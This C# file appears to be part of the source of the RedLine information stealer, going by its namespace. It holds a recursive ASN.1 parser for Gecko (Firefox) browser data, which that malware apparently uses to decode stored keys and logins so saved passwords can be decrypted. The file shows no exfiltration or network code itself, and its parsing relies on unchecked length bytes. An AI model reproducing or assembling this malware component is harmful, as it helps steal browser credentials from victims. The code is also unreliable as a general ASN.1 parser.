using RedLine.Models.Gecko;
using System;

namespace RedLine.Logic.Browsers.Gecko
{
	public static class Asn1Factory
	{
		public static Asn1Object Create(byte[] dataToParse)
		{
			Asn1Object asn1Object = new Asn1Object();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				Asn1Type asn1Type = (Asn1Type)dataToParse[i];
				int num = 0;
				switch (asn1Type)
				{
				case Asn1Type.Sequence:
				{
					byte[] array;
					if (asn1Object.ObjectLength == 0)
					{
						asn1Object.ObjectType = Asn1Type.Sequence;
						asn1Object.ObjectLength = dataToParse.Length - (i + 2);
						array = new byte[asn1Object.ObjectLength];
					}
					else
					{
						asn1Object.Objects.Add(new Asn1Object
						{
							ObjectType = Asn1Type.Sequence,
							ObjectLength = dataToParse[i + 1]
						});
						array = new byte[dataToParse[i + 1]];
					}
					num = ((array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length);
					Array.Copy(dataToParse, i + 2, array, 0, array.Length);
					asn1Object.Objects.Add(Create(array));
					i = i + 1 + dataToParse[i + 1];
					break;
				}
				case Asn1Type.Integer:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.Integer,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, num);
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				case Asn1Type.OctetString:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.OctetString,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, num);
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				case Asn1Type.ObjectIdentifier:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.ObjectIdentifier,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, num);
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				}
			}
			return asn1Object;
		}
	}
}
